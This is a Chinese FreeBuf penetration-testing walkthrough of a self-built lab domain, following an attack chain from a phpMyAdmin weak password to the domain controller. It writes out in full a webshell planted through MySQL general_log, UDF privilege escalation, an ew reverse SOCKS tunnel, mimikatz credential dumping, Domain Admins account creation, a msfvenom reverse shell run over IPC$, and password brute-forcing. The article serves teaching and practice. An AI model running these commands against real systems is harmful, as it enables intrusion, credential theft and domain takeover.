***本文作者：TimeS0ng，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**  

**严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

## 0x00. 引言

**做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。**

## 0x01. 渗透环境

此次域环境不是特别复杂，但是却包含了大部分渗透时需要掌握的知识，所以请诸位放心食用。

我们的入口只有一个w2k3搭建的web静态站点，我利用防火墙将对内网的访问阻挡在外部，但是将1.1.1.21的80端口映射到防火墙的80端口，所以我们只有通过webshell进入内网才能进一步控制域环境。此次环境的上帝视角如下：

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269804589609.png!small)

## 0x02. web渗透

首先打开我们获取的web站点地址[http://192.168.1.106](http://192.168.1.106/)
可以看到这是一个纯静态界面，一般遇到这种静态页面的环境我们可以选择先用御剑扫一扫目录或者用fierce爆破子域名，我这里没有设置域名更没有子域名，所以我就直接用御剑爆破目录了！

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269804985138.png!small)

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805052239.png!small)

爆破出来的目录比较全，接下来进行信息收集，看看能获取到什么有用的信息，一般如果能爆破出robots.txt文件的话千万记住要看看里面有什么站点，一般我们可以从那里面收集比较多实用的信息。通过逐一访问对我们较有用的地址有test.php、phpmyadmin/
其他地址基本都是静态或者用不了。 在test.php下面有管理员用于测试使用过的phpinfo()，通过它我们搜集到网站的根目录
G:/apm/apache2/htdocs 还有Apache、PHP版本，操作系统等一系列对我们后续渗透很有用的信息，这里记得打开文本记录一下。

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805188181.png!small)

进入phpMyAdmin之后利用默认密码登陆不上去，尝试使用phpMyAdmin爆破工具进行弱口令爆破，因为这个web站点唯一可以供我们控制的就只有phpMyAdmin/这一个页面了，所以必须拿下，不然就无法进行后续操作。

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805369497.png!small)
拿到账号密码之后直接登陆上去利用 INTO OUTFIEL 写免杀一句话木马，记住一定要指定正确的web根目录。但是运行的sql语句却被--secure-file-priv拦截了，这个默认配置让我们无法通过sql写文件，看来直接写木马是不现实了。

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805391801.png!small)

大家遇到问题一定要记住谷歌谷歌再谷歌，只要是问题大部分都会有相应的解决方法，这里也不例外，尽管不能直接写文件，那我修改日志文件并不为过吧！我们利用sql语句启动日志记录，将日志文件设置为根目录下的config.php，利用日志记录将一句话写进去，这样就能变相写入文件了！

    
    
    set global general_log='on';
    set global general_log_file='G:/apm/apache2/htdocs/config.php';
    select "<?php ($_=@$_GET[a]).@$_($_POST['cmd']); ?>";
    set global general_log=off;

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805533226.png!small)

既然一句话写进去了，此时直接用菜刀连，果然是武功再高也怕菜刀！连上去之后先看看我们当前账号拥有什么权限，权限过低的话需要提权！可以看到我们只拿到了域成员DMEMBER中的主机普通用户账号times0ng，连域账号都不是，太low啦！

> url = <http://192.168.1.106/config.php?a=assert> post=cmd

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805551161.png!small)

## 0x03. 数据库提权

既然如此我选择使用数据库udf提权，当然也可以利用其他方法提权，这里随意发挥就好。要使用数据库提权的前提是要将udf.dll文件写到G:\apm\Mysql\lib\plugin\目录下，还要有一个可供外部连接的数据库账号。写文件sql语句不行，但是菜刀可以，这解决了第一个问题；创建一个可供外部连接的数据库账号可以利用刚才拿到的phpMyAdimin创建，所有问题都迎刃而解！

    
    
    GRANT ALL PRIVILEGES ON *.* TO 'test'@'%' IDENTIFIED BY 'mysqltoor' WITH GRANT OPTION; 
    FLUSH PRIVILEGES; 

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805725842.png!small)

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805858915.png!small)
现在可以打开我的mysql提权工具进行提权啦，心情是不是莫名的好！首先创建一个cmdshell函数用于执行我们的命令，然后就可以创建管理员账号密码啦，这里我创建了一个test账号；同时打开靶机的3389端口供我们连接！

    
    
    Create Function cmdshell returns string soname 'udf.dll';
    select cmdshell('net user test admin@123 /add');
    select cmdshell('net localgroup administrators /add test');
    drop function cmdshell;
    
    Create Function open3389 returns string soname 'udf.dll';
    select open3389();
    drop function open3389;

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269805904321.png!small)

0x04. 建立隧道

虽然打开了靶机的3389端口，但是我们和靶机之间依旧隔着一堵碍眼的防火墙，无法直接连到靶机的3389上面去。不过没关系，本来就是练习技术嘛，所以接下来我将利用ew打穿一条socks5隧道！然后我们就能在内网中畅通无阻啦！不过在这之前我们还是需要先利用菜刀将ew客户端传到靶机上面去！

    
    
    ###################################
    # 攻击者在公网IP上 运行：
    ./ew_for_linux64 -s rcsocks -l 1080 -e 8888  //在公网上侦听1080端口，并把来自1080端口的流量重定向到8888端口
    # 受害者运行:
    ew_for_Win.exe -s rssocks -d [攻击者公网IP] -e 8888   
    # 然后 vim /etc/proxychains.conf 配置代理文件为：
    socks5 [攻击者公网IP] 1080     
    # 最后利用proxychains 执行命令
    proxychains rdesktop [受害者IP]:3389
    ###################################

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806015888.png!small)

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806062169.png!small)

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806283609.png!small)
0x05. 密码窃取

我们此时已经以管理员身份登陆了w2k3了，那么接下来可以上传一个mimikatz来窃取w2k3上的账号密码。下图所示是用mimikatz获取到的域成员的账号密码，同时还获取到本地管理员administrator的密码Admin!@

    
    
    privilege::debug
    sekurlsa::logonpasswords

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806317161.png!small)

拿到域账号之后我所能想到的就是先尽一切所能获取域相关的所有信息，正所谓知己知彼百战不殆。越是对域信息有足够的了解，我们对于拿下域控的把握就会越多！

    
    
    ###################################
    # 收集域名信息
    net view  						//获取当前组的计算机名字
    net view /domain   			//查看所有域
    ping -n 1 [组计算机明] -4  	//从计算机名获取IP 地址
    net user /domain				//查看域中的用户名
    net group /domain				//查看域组名称
    net group "Domain Admins" /domain     				//查询管理员
    net group "Domain controllers"  /domain           //查询域控
    net group "Domain Computers" /domain				//查询所有计算机名字
    net config Workstation								//查看当前计算机名、全名、用户名、系统版本、工作站域、登录域
    net group "Domain controllers" 						//查看域控制器
    
    
    
    net user admin Ad123test /add /domain	  			//添加普通域用户
    net group "Domain Admins" admin /add /domain 		//提升到域管理员
    ###################################

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806388581.png!small)

上面是我使用域账号w2k3登陆之后获取到的部分信息，可以看到我们当前的主机名为DMEMBER，我们属于pentestlab域，域下面还有两台主机，分别是DMEMBER1、DCSERVER
，下面我们尝试使用IPC$入侵DMEMBER1这台级别和我们相当的域主机。

## 0x06. IPC$ 入侵

这里其实我们可以直接使用ms08_067拿到winxp的shell，但是作为实验目的我选择更具有操作性的IPC$入侵，所以我先用刚才获取的administrator账号登陆w2k3，然后与DMEMBER1
建立空连接，将msf生成的木马拷贝到DMEMBER1上，利用at 任务计划执行我们的木马，于是我们就能获取到一个来自DMEMBER1 的反弹shell.

    
    
    ###################################
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.111 lport=4444 -f exe -o msf.exe	\\利用msf生成木马
    net use \\dmember1\ipc$                 //建立ipc$空连接
    copy c:\msf.exe \\dmember1\c$\msf.exe		//拷贝木马到目标机器上面去
    net time \\dmember1						//查看目标的时间
    at \\dmember1 2:35 %path%\msf.exe		//利用at任务执行木马，记住删除任务
    ###################################

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806472218.png!small)

现在我们需要做的就是在msf上启动监听，等待计划任务的时间到达。

    
    
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set lhost 192.168.1.111
    run

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806638055.png!small)

0x07. 获取域控

当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token...

    
    
    use incognito 
    list_tokens –u #列出可用token，假如找到域控token 
    impersonate_token lab\\administrator 

下面我换一种方式得到域控的shell：首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806697978.png!small)

接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！

> ipccrack.bat dcserver admin$ password.txt

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806741661.png!small)

账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透

![漫谈攻击链：从webshell到域控的奇妙之旅](https://image.3001.net/images/20180522/15269806918651.png!small)
0x08. 结语

此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：[网盘链接:](https://pan.baidu.com/s/1rp9jP3SLycSgrhqs7AxyXQ)
<https://pan.baidu.com/s/1rp9jP3SLycSgrhqs7AxyXQ> 密码:fcxx

 ***本文作者：TimeS0ng，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

